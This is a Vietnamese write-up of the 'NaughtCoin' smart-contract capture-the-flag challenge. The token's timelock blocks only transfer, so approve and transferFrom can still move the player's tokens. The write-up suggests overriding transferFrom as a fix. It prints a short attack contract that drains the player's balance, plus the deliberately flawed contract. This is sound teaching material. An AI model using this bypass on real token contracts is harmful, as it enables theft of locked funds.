### Kết luận 
- Lỗ hổng: Hàm transfer bị khóa nhưng `player` vẫn có thể sử dụng hàm `approve` và `transferFrom` để chuyển tokens. (theo chuẩn ERC20).
- Cách phòng tránh: Modifier `lockTokens` cần được mở rộng để kiểm tra mọi hành động ảnh hưởng đến số dư của `player`, bao gồm cả `approve` và `transferFrom`.
- Hoặc có thể chặn trực tiếp trong hàm.
VD:
```solidity
function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    if (sender == player) {
        require(block.timestamp > timeLock, "Tokens are locked.");
    }
    return super.transferFrom(sender, recipient, amount);
}

```
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
interface INaughtCoin is IERC20 {}
contract NaughtCoinAttack{
    INaughtCoin public victim;
    constructor (address challenge){
        victim = INaughtCoin(challenge);
    }
    function attack(address _player) public payable{
        require(victim.balanceOf(_player) > 0, "Player has no tokens to steal");
        victim.transferFrom(_player, address(this), victim.balanceOf(_player));
    }
    // Cần gọi hàm approve để cấp quyền trước khi tấn công ở hợp đồng NaughtCoin do hợp dồng tấn công k có quyền gọi hàm approve.
    // victim.approve(address(this), victim.balanceOf(msg.sender));
}
```
### Contract 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
